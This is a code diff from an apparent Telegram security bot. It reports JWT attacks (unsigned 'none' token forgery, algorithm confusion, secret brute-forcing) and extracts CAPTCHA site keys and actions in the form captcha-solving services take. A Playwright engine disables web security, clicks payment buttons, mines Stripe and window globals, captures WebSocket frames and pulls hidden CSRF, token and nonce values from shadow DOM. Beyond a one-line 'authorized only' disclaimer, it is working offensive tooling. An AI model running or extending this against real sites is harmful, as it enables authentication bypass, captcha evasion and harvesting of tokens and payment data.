-    lines = [
-        "🎟️ *JWT Attack Report*",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "",
-        f"*① Decoded Token:*",
-        f"  Algorithm: `{alg}`",
-        f"  Header: `{json.dumps(header, separators=(',',':'))[:100]}`",
-        f"",
-        f"*📋 Payload:*",
-        payload_str,
-        "",
-    ]
-
-    # None attack result
-    lines.append("*② None Algorithm Bypass:*")
-    if none_res.get("success"):
-        forged = none_res['forged_token']
-        lines.append(f"  ✅ *VULNERABLE — unsigned token forged!*")
-        lines.append(f"  Original alg: `{none_res['original_alg']}`")
-        lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
-        lines.append(f"  _{none_res.get('note','')}_")
-    else:
-        lines.append(f"  ⚪ Not applicable or failed")
-    lines.append("")
-
-    # Alg confusion result
-    lines.append("*③ Algorithm Confusion:*")
-    if alg_res.get("success"):
-        lines.append(f"  🟠 RS256 → HS256 confusion possible!")
-        lines.append(f"  _{alg_res.get('note','')[:150]}_")
-    else:
-        lines.append(f"  ⚪ {alg_res.get('note', 'Not applicable')}")
-    lines.append("")
-
-    # Brute-force result
-    lines.append("*④ Secret Key Brute-force:*")
-    if bf_res.get("cracked"):
-        secret = bf_res['secret']
-        lines.append(f"  🔴 *SECRET FOUND!*")
-        lines.append(f"  Key: `{secret}`")
-        lines.append(f"  Algorithm: `{bf_res.get('alg','?')}`")
-        lines.append(f"  Tried: `{bf_res.get('tried',0)}` passwords")
-    elif "error" in bf_res:
-        lines.append(f"  ⚪ `{bf_res['error']}`")
-    else:
-        lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
-        lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
-    lines.append("")
-    lines.append("━━━━━━━━━━━━━━━━━━")
-    lines.append("⚠️ _Authorized security research only_")
-
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-    # Export full JSON report
-    import io
-    full_report = {
-        "token": token,
-        "decoded": decoded,
-        "none_attack": none_res,
-        "alg_confusion": alg_res,
-        "brute_force": bf_res,
-        "analyzed_at": datetime.now().isoformat(),
-    }
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    report_buf = io.BytesIO(json.dumps(full_report, indent=2, default=str).encode())
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=report_buf,
-            filename=f"jwt_report_{ts}.json",
-            caption="🎟️ *JWT Full Report* — JSON export",
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.warning("JWT export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🔑  FEATURE 13 — CAPTCHA Site Key Extractor (/sitekey)
-#     reCAPTCHA v2/v3 · hCaptcha · Turnstile · FunCaptcha
-#     Extracts: site_key, page_url, action, captcha_type
-# ══════════════════════════════════════════════════
-
-# ── Regex patterns per captcha type ─────────────
 _CAPTCHA_PATTERNS = {
 
-    # ─── reCAPTCHA v2 ────────────────────────────
+    # ─── reCAPTCHA v2 ─────────────────────────────────────────────────────────
+    # Real Google reCAPTCHA v2 sitekeys ALWAYS start with "6L" and are 40 chars.
+    # Patterns here require that prefix to prevent cross-labeling hCaptcha/Turnstile.
     "reCAPTCHA v2": [
-        # data-sitekey attribute
-        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        # grecaptcha.render
-        re.compile(r'grecaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        # siteKey / site_key object key
-        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        re.compile(r'["\']site_key["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        re.compile(r'siteKey\s*[=:]\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
+        # data-sitekey="6Lxxxxxx..." — 6L prefix enforced
+        re.compile(r'data-sitekey=["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # grecaptcha.render({sitekey:"6L..."})
+        re.compile(r'grecaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # {sitekey:"6L..."} / {site_key:"6L..."}
+        re.compile(r'["\']sitekey["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        re.compile(r'["\']site_key["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # siteKey = "6L..." / siteKey: "6L..."
+        re.compile(r'siteKey\s*[=:]\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # recaptcha/api.js?render=6Lxxx (v2 explicit render param in script URL)
+        re.compile(r'recaptcha/api\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
     ],
 
-    # ─── reCAPTCHA v3 ────────────────────────────
+    # ─── reCAPTCHA v3 ─────────────────────────────────────────────────────────
+    # v3 keys also start with "6L" — distinguish from v2 by grecaptcha.execute context.
     "reCAPTCHA v3": [
-        # grecaptcha.execute(key, {action:...})
-        re.compile(r'grecaptcha\.execute\s*\(\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        # grecaptcha.ready + execute in same script
-        re.compile(r'execute\(["\']([6][A-Za-z0-9_\-]{39})["\']', re.I),
+        # grecaptcha.execute("6Lxxx", {action:...}) — canonical v3 call
+        re.compile(r'grecaptcha\.execute\s*\(\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # grecaptcha.ready(function(){ ... execute("6L...") })
+        re.compile(r'execute\(["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        # recaptcha/api.js?render=6Lxxx (v3 uses render= in script src)
+        re.compile(r'recaptcha/(?:api|enterprise)\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
+        # window.RECAPTCHA_SITE_KEY / NEXT_PUBLIC_RECAPTCHA_KEY = "6L..."
+        re.compile(r'(?:RECAPTCHA|RECAPTCHA_SITE|NEXT_PUBLIC_RECAPTCHA)[_A-Z]*\s*[=:]\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
     ],
 
-    # ─── hCaptcha ────────────────────────────────
+    # ─── reCAPTCHA Enterprise ──────────────────────────────────────────────────
+    # Enterprise keys also begin with 6L but loaded via /recaptcha/enterprise.js
+    "reCAPTCHA Enterprise": [
+        re.compile(r'enterprise\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
+        re.compile(r'grecaptcha_enterprise\s*\.\s*(?:execute|render)\s*\(\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+        re.compile(r'RecaptchaEnterpriseServiceV1Beta1[^"\']*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
+    ],
+
+    # ─── hCaptcha ─────────────────────────────────────────────────────────────
+    # hCaptcha sitekeys are UUIDs: 8-4-4-4-12 hex format (lowercase).
+    # Must be checked BEFORE any generic data-sitekey scan.
     "hCaptcha": [
+        # data-sitekey="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
         re.compile(r'data-sitekey=["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
-        re.compile(r'hcaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9a-f\-]{36})["\']', re.I),
+        # hcaptcha.render({sitekey:"uuid"})
+        re.compile(r'hcaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
+        # {sitekey:"uuid"} in hcaptcha context
         re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
+        # hcaptcha.com/checksiteconfig?sitekey=uuid
+        re.compile(r'hcaptcha\.com/(?:checksiteconfig|getcaptcha|anchor)[^"\']*[?&](?:sitekey|s)=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I),
+        # HCAPTCHA_SITE_KEY = "uuid"
+        re.compile(r'HCAPTCHA[_A-Z]*\s*[=:]\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
     ],
 
-    # ─── Cloudflare Turnstile ─────────────────────
+    # ─── Cloudflare Turnstile ─────────────────────────────────────────────────
+    # Turnstile sitekeys start with "0x" or "1x" followed by hex chars.
+    # Must NOT match reCAPTCHA 6L keys or hCaptcha UUIDs.
     "Cloudflare Turnstile": [
-        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\'].*?turnstile|turnstile.*?data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I | re.S),
-        re.compile(r'turnstile\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
-        # Turnstile keys start with 0x4A or 1x00
-        re.compile(r'["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
-        re.compile(r'data-sitekey=["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
+        # data-sitekey="0x4A..." or "1x00..."
+        re.compile(r'data-sitekey=["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
+        # turnstile.render({sitekey:"0x..."})
+        re.compile(r'turnstile\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
+        # {sitekey:"0x..."} in turnstile context (require 0x/1x prefix strictly)
+        re.compile(r'["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
+        # challenges.cloudflare.com/turnstile URL sitekey param
+        re.compile(r'challenges\.cloudflare\.com/turnstile[^"\']*[?&](?:sitekey|k)=([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})', re.I),
+        # CF_TURNSTILE_SITE_KEY = "0x..."
+        re.compile(r'(?:TURNSTILE|CF_TURNSTILE)[_A-Z]*\s*[=:]\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
     ],
 
-    # ─── FunCaptcha (Arkose Labs) ─────────────────
+    # ─── FunCaptcha / Arkose Labs ─────────────────────────────────────────────
+    # Keys are UUIDs — distinguish from hCaptcha by context (public_key / ArkoseEnforcement)
     "FunCaptcha": [
         re.compile(r'(?:public_key|data-pkey)\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
         re.compile(r'ArkoseEnforcement\s*\([^)]*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
+        re.compile(r'arkose[_\-]?(?:labs)?[_\-]?(?:public)?[_\-]?key\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
     ],
 
-    # ─── GeeTest ─────────────────────────────────
+    # ─── GeeTest ─────────────────────────────────────────────────────────────
+    # GeeTest gt param: 32 hex chars
     "GeeTest": [
-        re.compile(r'gt\s*[=:]\s*["\']([0-9a-f]{32})["\']', re.I),
+        re.compile(r'\bgt\s*[=:]\s*["\']([0-9a-f]{32})["\']', re.I),
         re.compile(r'["\']gt["\']\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
+        re.compile(r'initGeetest\s*\([^)]*gt\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
     ],
 
-    # ─── AWS WAF Captcha ──────────────────────────
+    # ─── AWS WAF Captcha ──────────────────────────────────────────────────────
     "AWS WAF Captcha": [
         re.compile(r'AwsWafIntegration\.getToken\s*\(\s*["\']([^"\']{10,200})["\']', re.I),
         re.compile(r'jsapi\.token\s*[=:]\s*["\']([^"\']{10,200})["\']', re.I),
     ],
+
+    # ─── FriendlyCaptcha ─────────────────────────────────────────────────────
+    # FriendlyCaptcha site keys start with "FC" prefix
+    "FriendlyCaptcha": [
+        re.compile(r'data-sitekey=["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
+        re.compile(r'["\']sitekey["\']\s*:\s*["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
+        re.compile(r'FriendlyCaptcha\s*\([^)]*["\']sitekey["\']\s*:\s*["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
+    ],
 }
 
-# ─── reCAPTCHA action pattern ────────────────────
+# ─── Priority scan order (more specific first to avoid cross-labeling) ────────
+# hCaptcha (UUID) and Turnstile (0x/1x) must resolve before generic sitekey scan.
+_CAPTCHA_SCAN_ORDER = [
+    "hCaptcha",            # UUID format — most distinct, check first
+    "FunCaptcha",          # UUID format with specific context keywords
+    "Cloudflare Turnstile",# 0x/1x prefix — check before generic sitekey
+    "FriendlyCaptcha",     # FC prefix
+    "reCAPTCHA Enterprise",# enterprise.js context
+    "reCAPTCHA v3",        # grecaptcha.execute context
+    "reCAPTCHA v2",        # grecaptcha.render / data-sitekey with 6L
+    "GeeTest",             # 32-char hex gt param
+    "AWS WAF Captcha",     # AwsWafIntegration context
+]
+
+# ─── reCAPTCHA action pattern ─────────────────────────────────────────────────
 _ACTION_PATTERNS = [
     re.compile(r'action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
     re.compile(r'["\']action["\']\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
     re.compile(r'grecaptcha\.execute\s*\([^,]+,\s*\{[^}]*action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
 ]
 
-# ─── Script src patterns (detect captcha from includes) ─
+# ─── Script src signatures ────────────────────────────────────────────────────
 _CAPTCHA_SCRIPT_SIGS = {
-    "reCAPTCHA": ["google.com/recaptcha", "recaptcha/api.js", "recaptcha/enterprise.js"],
-    "hCaptcha":  ["hcaptcha.com/1/api.js", "js.hcaptcha.com"],
-    "Turnstile": ["challenges.cloudflare.com/turnstile"],
-    "FunCaptcha": ["funcaptcha.com", "arkoselabs.com"],
-    "GeeTest":   ["gt.captcha.com", "static.geetest.com"],
+    "reCAPTCHA":         ["google.com/recaptcha", "recaptcha/api.js"],
+    "reCAPTCHA Enterprise": ["recaptcha/enterprise.js"],
+    "hCaptcha":          ["hcaptcha.com/1/api.js", "js.hcaptcha.com"],
+    "Turnstile":         ["challenges.cloudflare.com/turnstile"],
+    "FunCaptcha":        ["funcaptcha.com", "arkoselabs.com"],
+    "GeeTest":           ["gt.captcha.com", "static.geetest.com"],
+    "FriendlyCaptcha":   ["friendlycaptcha.com/widget", "friendlycaptcha.eu"],
+}
+
+# ─── Key format validators — confirm a key matches expected format ────────────
+_KEY_VALIDATORS = {
+    "reCAPTCHA v2":         lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
+    "reCAPTCHA v3":         lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
+    "reCAPTCHA Enterprise": lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
+    "hCaptcha":             lambda k: bool(re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', k, re.I)),
+    "Cloudflare Turnstile": lambda k: bool(re.match(r'^[01]x', k)),
+    "FunCaptcha":           lambda k: bool(re.match(r'^[0-9A-Fa-f]{8}-', k)),
+    "GeeTest":              lambda k: bool(re.match(r'^[0-9a-f]{32}$', k, re.I)),
+    "FriendlyCaptcha":      lambda k: k.upper().startswith("FC"),
+    "AWS WAF Captcha":      lambda k: len(k) >= 10,
 }
 
 
 def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> list:
     """
-    Extract all captcha site_key / action / page_url from HTML + JS.
+    Extract captcha site_key / action / page_url from HTML + JS.
+    v21 fix: priority scan order prevents cross-labeling between
+    hCaptcha (UUID), Turnstile (0x/1x), and reCAPTCHA (6L) keys.
     Returns list of finding dicts.
     """
-    findings = []
-    seen_keys = set()
+    findings  = []
+    seen_keys = set()   # dedup by (key_value) — key is unique regardless of type
 
     def _scan_text(text: str, source_label: str):
-        for cap_type, patterns in _CAPTCHA_PATTERNS.items():
+        # Iterate in priority order so hCaptcha/Turnstile claim keys before
+        # the generic reCAPTCHA data-sitekey fallback can misattribute them.
+        for cap_type in _CAPTCHA_SCAN_ORDER:
+            patterns  = _CAPTCHA_PATTERNS.get(cap_type, [])
+            validator = _KEY_VALIDATORS.get(cap_type)
             for pat in patterns:
                 for m in pat.finditer(text):
-                    # Get first non-None group (handles alternation patterns)
+                    # Handle alternation groups (e.g. Turnstile context pattern)
                     if m.lastindex and m.lastindex >= 1:
                         key = next((g for g in m.groups() if g), None)
                     else:
@@ -5906,18 +5064,26 @@ def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> 
                             key = m.group(1)
                         except IndexError:
                             key = m.group(0)
+
                     if not key:
                         continue
                     key = key.strip()
                     if len(key) < 10:
                         continue
-                    dedup = cap_type + ":" + key
-                    if dedup in seen_keys:
-                        continue
-                    seen_keys.add(dedup)
 
-                    # Extract action from surrounding context (±400 chars)
-                    action = ""
+                    # ── Validate format — reject cross-type false positives ──
+                    if validator and not validator(key):
+                        continue
+
+                    # ── Dedup by raw key value (not by type+key) ─────────────
+                    # This prevents the same key appearing as both reCAPTCHA v2
+                    # and reCAPTCHA v3 when matched by different patterns.
+                    if key in seen_keys:
+                        continue
+                    seen_keys.add(key)
+
+                    # ── Extract action from surrounding ±400 char context ─────
+                    action    = ""
                     ctx_start = max(0, m.start() - 400)
                     ctx_end   = min(len(text), m.end() + 400)
                     ctx       = text[ctx_start:ctx_end]
@@ -5925,8 +5091,8 @@ def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> 
                         am = ap.search(ctx)
                         if am:
                             cand = am.group(1)
-                            # Filter out false-positives (too generic)
-                            if cand not in ('get','set','use','new','add','key','id'):
+                            if cand not in ('get', 'set', 'use', 'new',
+                                            'add', 'key', 'id', 'login'):
                                 action = cand
                                 break
 
@@ -5941,7 +5107,7 @@ def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> 
                         "invisible":  False,
                         "badge":      "",
                         "min_score":  "",
-                        "enterprise": False,
+                        "enterprise": cap_type == "reCAPTCHA Enterprise",
                         "s_param":    "",
                         "hl":         "",
                         "co":         "",
@@ -5949,33 +5115,32 @@ def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> 
                         "user_agent": "",
                     })
 
-    # Scan main HTML
+    # ── 1. Scan main HTML body ────────────────────────────────────────────────
     _scan_text(html, "HTML source")
 
-    # Scan inline scripts separately for better context
+    # ── 2. Scan each inline <script> block separately for better context ──────
     soup = BeautifulSoup(html, 'html.parser')
     for i, script in enumerate(soup.find_all('script')):
         if script.string and script.string.strip():
             _scan_text(script.string, f"Inline script #{i}")
 
-    # Scan external JS sources if provided
+    # ── 3. Scan external JS sources if provided ───────────────────────────────
     if js_sources:
         for js_url, js_text in js_sources.items():
             _scan_text(js_text, f"JS: {js_url[:60]}")
 
-    # ─── Detect captcha type from script src (even without key) ──
-    script_tags = [t.get('src', '') for t in soup.find_all('script', src=True)]
+    # ── 4. Script-src detection (captcha present but key not yet found) ───────
+    script_tags        = [t.get('src', '') for t in soup.find_all('script', src=True)]
     detected_via_script = set()
     for src in script_tags:
         for cap_type, sigs in _CAPTCHA_SCRIPT_SIGS.items():
             if any(sig in src for sig in sigs):
                 detected_via_script.add((cap_type, src))
 
-    # Add script-detected types that have no key found yet
-    found_types = {f["type"].split()[0] for f in findings}
+    # Only append "key not found" entries for types not already resolved
+    found_types = {f["type"] for f in findings}
     for cap_type, src in detected_via_script:
-        short = cap_type.split()[0]
-        if short not in found_types:
+        if cap_type not in found_types:
             findings.append({
                 "type":     cap_type + " ⚠️ (key not found)",
                 "site_key": "",
@@ -5985,22 +5150,6 @@ def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> 
             })
 
     return findings
-
-
-# ════════════════════════════════════════════════════════════
-# NEW _sitekey_playwright — works even when JS files blocked
-# Techniques:
-#  1. Network interception (request URLs + POST bodies)
-#  2. Response body scan (captcha API JSON responses)
-#  3. DOM deep scan after full JS execution
-#  4. window object mining (grecaptcha, hcaptcha, turnstile)
-#  5. JavaScript variable extraction via page.evaluate
-#  6. iframe src scan (captcha widgets inside iframes)
-#  7. Shadow DOM traversal
-#  8. MutationObserver hook (catches dynamically injected widgets)
-#  9. Click/interact simulation (trigger lazy-load captchas)
-# 10. Console log scraping
-# ════════════════════════════════════════════════════════════
 
 def _sitekey_playwright(url: str, progress_cb=None) -> dict:
     try:
@@ -7020,8 +6169,8 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
     """
     v19 UPGRADED Core Engine:
     - networkidle wait (JS SDK တွေ fully load ဖြစ်မှ scan)
-    - response body 120KB (JS bundle တွေ အပြည့်ဖမ်း)
-    - JS files 25 ခု fetch (lazy-loaded chunks ပါ)
+    - response body 512KB (Phase 2: 120KB→512KB — webpack chunk အပြည့်ဖမ်း)
+    - JS files 60 ခု fetch (Phase 2: 25→60 — code-split apps ပါ)
     - disable-web-security: iframe cross-origin request ဖမ်းနိုင်
     - Interactive simulation: scroll + payment button click
     - window globals deep scan: __NEXT_DATA__, __nuxt__, Stripe, etc.
@@ -7100,7 +6249,7 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
                     "url": url_str,
                     "method": method,
                     "post_data": post_data[:3000] if post_data else "",
-                    "response_body": response_body[:120000] if response_body else "",
+                    "response_body": response_body[:524288] if response_body else "",
                 })
 
         def _on_request(req):
@@ -7128,13 +6277,29 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
             for entry in network_log:
                 if entry["url"] == resp.url:
                     if not entry["response_body"]:
-                        entry["response_body"] = body[:120000]
+                        entry["response_body"] = body[:524288]
                     return
-            _add_network(resp.url, "GET", "", body)
+            _add_network(resp.url, "GET", "", body[:524288])
 
         page.on("request",  _on_request)
         page.on("response", _on_response)
         page.on("console",  lambda m: console_log.append(m.text[:500]))
+
+        # ── Phase 3 Fix 1: WebSocket frame capture ──
+        _ws_frames = []
+        def _on_websocket(ws):
+            ws_url = ws.url
+            def _on_frame_sent(payload):
+                if payload and len(str(payload)) > 4:
+                    _ws_frames.append({"dir": "send", "url": ws_url,
+                                       "payload": str(payload)[:500]})
+            def _on_frame_recv(payload):
+                if payload and len(str(payload)) > 4:
+                    _ws_frames.append({"dir": "recv", "url": ws_url,
+                                       "payload": str(payload)[:500]})
+            ws.on("framesent",   _on_frame_sent)
+            ws.on("framereceived", _on_frame_recv)
+        page.on("websocket", _on_websocket)
 
         # ── Step 1: Initial page load — wait for networkidle ──
         try:
@@ -7238,10 +6403,54 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
                 except Exception:
                     pass
 
-        # Fetch uncaptured JS files (up to 25)
+        # ── Phase 2: Link header preload + dynamic import() chunk discovery ──
+        import re as _re2
+        # 1. HTTP Link header
+        try:
+            _link_resp = ctx.request.get(page_url_ref[0], timeout=5000)
+            _link_hdr  = _link_resp.headers.get("link", "") or _link_resp.headers.get("Link", "")
+            for _lm in _re2.finditer(r'<([^>]+\.js)>', _link_hdr):
+                _lurl = _lm.group(1)
+                if not _lurl.startswith("http"):
+                    _lurl = _origin + (_lurl if _lurl.startswith("/") else "/" + _lurl)
+                if _lurl not in _seen_urls:
+                    js_urls_on_page.append(_lurl)
+        except Exception:
+            pass
+
+        # 2. Dynamic import() / require.ensure() chunk URLs in already-fetched JS
+        _dyn_pat = _re2.compile(r'(?:import\(|require\.ensure\(\[?)["\']([^"\']+\.js)["\']')
+        for _entry in list(network_log):
+            for _dm in _dyn_pat.finditer(_entry.get("response_body", "")[:80000]):
+                _chunk = _dm.group(1)
+                if not _chunk.startswith("http"):
+                    _chunk = _origin + ("/" if not _chunk.startswith("/") else "") + _chunk
+                if _chunk not in _seen_urls:
+                    js_urls_on_page.append(_chunk)
+
+        # 3. Next.js _buildManifest chunk list
+        try:
+            _bm_urls = _re2.findall(r'/_next/static/[^"\']+/_buildManifest\.js', html)
+            for _bmu in _bm_urls[:2]:
+                _bm_full = _origin + _bmu
+                if _bm_full not in _seen_urls:
+                    _bmr = ctx.request.get(_bm_full, timeout=5000)
+                    if _bmr.ok:
+                        _add_network(_bm_full, "GET", "", _bmr.text())
+                        for _nc in _re2.findall(r'"(/[^"]+\.js)"', _bmr.text()):
+                            _ncu = _origin + _nc
+                            if _ncu not in _seen_urls:
+                                js_urls_on_page.append(_ncu)
+        except Exception:
+            pass
+
+        # Deduplicate chunk list
+        js_urls_on_page = list(dict.fromkeys(js_urls_on_page))
+
+        # Fetch uncaptured JS files (up to 60, Phase 2)
         fetched = 0
         for js_url in js_urls_on_page:
-            if fetched >= 25:
+            if fetched >= 60:
                 break
             if js_url in _seen_urls:
                 existing = next((e for e in network_log if e["url"] == js_url), None)
@@ -7251,7 +6460,7 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
                 r = ctx.request.get(js_url, timeout=10000)
                 if r.ok:
                     body = r.text()
-                    _add_network(js_url, "GET", "", body)
+                    _add_network(js_url, "GET", "", body[:524288])
                     fetched += 1
             except Exception:
                 pass
@@ -7365,16 +6574,27 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
         except Exception as e:
             logger.debug("Deep globals JS eval error: %s", e)
 
-        # Run caller-provided js_eval_code on top
-        if js_eval_code:
-            try:
-                extra = page.evaluate(js_eval_code)
-                if extra and isinstance(extra, dict) and dom_result:
-                    dom_result.update(extra)
-                elif extra:
-                    dom_result = extra
-            except Exception as e:
-                logger.debug("Custom JS eval error: %s", e)
+        # ── Step 4b: ShadowDOM pierce — Playwright pierce: selector (open roots) ──
+        try:
+            shadow_inputs = page.query_selector_all(
+                "pierce/input[type=hidden], pierce/input[name*=csrf], "
+                "pierce/input[name*=token], pierce/input[name*=nonce]"
+            )
+            shadow_findings = []
+            for si in shadow_inputs:
+                try:
+                    name_attr  = si.get_attribute("name") or si.get_attribute("id") or "shadow-hidden"
+                    value_attr = si.input_value() or ""
+                    if len(value_attr) >= 8:
+                        shadow_findings.append({"name": name_attr, "value": value_attr[:200], "tag": "SHADOW-INPUT"})
+                except Exception:
+                    pass
+            if shadow_findings and dom_result is not None:
+                dom_result["__shadow_tokens__"] = shadow_findings
+            elif shadow_findings:
+                dom_result = {"__shadow_tokens__": shadow_findings}
+        except Exception as _se:
+            logger.debug("ShadowDOM pierce scan error: %s", _se)
 
         # ── Step 5: Traverse all frames for payment data ──
         frame_data = []
@@ -7403,6 +6623,20 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
         if frame_data and dom_result is not None:
             dom_result["__frames__"] = json.dumps(frame_data)
 
+        # Wire WS frames into network_log as special entries
+        for _wsf in _ws_frames:
+            network_log.append({
+                "url":           f"[ws] {_wsf['url']}",
+                "method":        f"WS:{_wsf['dir'].upper()}",
+                "post_data":     _wsf["payload"] if _wsf["dir"] == "send" else "",
+                "response_body": _wsf["payload"] if _wsf["dir"] == "recv" else "",
+                "content_type":  "application/websocket-frame",
+            })
+        if _ws_frames and dom_result is not None:
+            dom_result["__ws_urls__"] = json.dumps(
+                list(dict.fromkeys(f["url"] for f in _ws_frames))[:20]
+            )
+
         browser.close()
 
     return {
@@ -7412,6 +6646,7 @@ def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> di
         "console_log": console_log,
         "dom_result":  dom_result,
         "page_url":    page_url_ref[0],
+        "ws_frames":   _ws_frames,
     }
 
 
@@ -7465,12 +6700,102 @@ def _gather_all_text(data: dict) -> list:
     return texts
 
 
+def _multipage_crawl(base_url: str, js_eval_code: str,
+                     max_pages: int = 5, progress_cb=None) -> list:
+    """
+    Phase 3 Fix 2: Multi-page same-origin crawl.
+    Follows href links on the seed page (same origin only),
+    runs _run_playwright_extract on each, merges network_log + html.
+    Returns list of extract dicts (one per page crawled).
+    """
+    from urllib.parse import urlparse as _up_mc, urljoin as _uj
+    _base = _up_mc(base_url)
+    _origin = f"{_base.scheme}://{_base.netloc}"
+    visited  = set()
+    queue    = [base_url]
+    results  = []
+
+    while queue and len(visited) < max_pages:
+        url = queue.pop(0)
+        # Normalise — strip fragment
+        clean = url.split("#")[0].rstrip("/") or url
+        if clean in visited:
+            continue
+        visited.add(clean)
+
+        if progress_cb:
+            progress_cb(f"🕷️ Crawling page {len(visited)}/{max_pages}: `{_up_mc(url).path or '/'}`")
+
+        data = _run_playwright_extract(url, js_eval_code, progress_cb=None)
+        if data.get("error"):
+            continue
+        results.append(data)
+
+        # Discover same-origin links from HTML
+        if len(visited) < max_pages:
+            from bs4 import BeautifulSoup as _BS
+            try:
+                soup = _BS(data.get("html",""), "html.parser")
+                for a in soup.find_all("a", href=True):
